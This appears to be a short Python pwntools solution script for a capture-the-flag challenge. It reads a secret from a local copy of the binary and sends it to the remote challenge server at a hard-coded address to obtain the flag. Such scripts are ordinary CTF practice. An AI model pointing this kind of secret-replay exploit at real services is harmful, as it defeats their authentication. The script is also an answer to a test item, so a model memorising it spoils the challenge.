#!/usr/bin/env python3
from pwn import *

p = process('./test')
r = remote('140.113.24.241', 30171)
p.sendlineafter(b'Please enter the secret:', b'1')
p.recvline()
secret = str(p.recvline().decode())
print(secret)
r.sendlineafter(b'Please enter the secret:', secret)
# r.recvuntil(b'You got it! Here is your flag!\n')
print(r.recvall().decode())